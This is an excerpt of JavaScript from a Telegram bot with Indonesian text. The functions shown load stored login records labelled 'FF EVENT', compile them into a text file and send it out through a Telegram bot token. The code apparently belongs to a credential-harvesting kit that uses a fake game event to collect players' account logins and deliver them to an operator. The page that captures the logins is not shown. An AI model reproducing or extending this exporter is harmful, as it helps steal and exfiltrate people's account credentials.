...
async function sendExportFile(chat) {
  const logins  = await ghLoadData();
  const total   = logins.length;
  const token   = getTgToken();
  if (!token) return null;
  if (total === 0) {
    return tgSend(chat, '\u{1F4E4} <b>EXPORT DATA</b>\n' + LINE + '\n\n<i>Belum ada data untuk diekspor.</i>', {
  ...
  lines.push('  EXPORT DATA LOGIN — FF EVENT');
  lines.push('  Total: ' + total + ' data | ' + genTime + ' WIB');
  lines.push('='.repeat(60));
  lines.push('');
  lines.push(
    '#'.padEnd(5) + '|' +
  ...
  lines.push('');
  lines.push('='.repeat(60));
  lines.push('  Generated by @IWX_FFBot');
  lines.push('='.repeat(60));

  const fileContent = Buffer.from(lines.join('\n'), 'utf-8');
  const filename    = 'logins_' + Date.now() + '.txt';
  const boundary    = '----FormBoundary' + Math.random().toString(36).slice(2);

  const caption =
    '\u{1F4E4} <b>EXPORT SELESAI</b>\n' + LINE + '\n\n' +
    '\u{1F4CA} <b>Total</b>  : <b>' + total + '</b> data\n' +
    '\u{1F4C4} <b>File</b>   : <code>' + filename + '</code>\n' +
    '\u231A <b>Waktu</b>  : ' + genTime + ' WIB\n\n' +
    '<i>Buka file .txt untuk melihat semua data login.</i>';
...
async function buildExport() {
  ...
  if (total === 0) {
    return {
      text: '\u{1F4E4} <b>EXPORT DATA</b>\n' + LINE + '\n\n<i>Belum ada data untuk diekspor.</i>',
      keyboard: { inline_keyboard: [[{ text: '\uD83D\uDD19 Menu Utama', callback_data: 'menu' }]] }
    };
  }
  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const text =
    '\u{1F4E4} <b>EXPORT DATA</b>\n' + LINE + '\n\n' +
    '\u{1F4CA} Total  : <b>' + total + '</b> data\n' +
    '\u231A Waktu  : ' + genTime + ' WIB\n\n' +
    '<i>Gunakan /export untuk mendapatkan file .txt semua data.</i>';
  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '\u{1F4E4} Download File .txt', callback_data: 'export_file' }],
        [{ text: '\u{1F4CB} Lihat Detail', callback_data: 'data_0' }, { text: '\u{1F4C8} Statistik', callback_data: 'stats' }],
        [{ text: '\uD83D\uDD19 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
